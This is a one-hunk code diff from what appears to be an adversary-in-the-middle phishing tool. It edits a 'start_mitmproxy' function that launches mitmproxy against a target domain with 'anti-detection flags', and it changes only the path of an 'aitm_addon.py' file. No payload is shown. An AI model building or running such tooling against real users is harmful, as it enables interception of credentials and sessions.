@@ -668,7 +668,7 @@ def phish_temp():
 def start_mitmproxy(port, target_domain, verbose=False, upstream_proxy=None):
     """Launch mitmproxy with upstream proxy support + anti-detection flags."""
     try:
-        addon_path = os.path.abspath("aitm_addon.py")
+        addon_path = os.path.abspath("aitm/aitm_addon.py")
         if not os.path.exists(addon_path):
             st.error(f"Addon not found: {addon_path}")
             return False
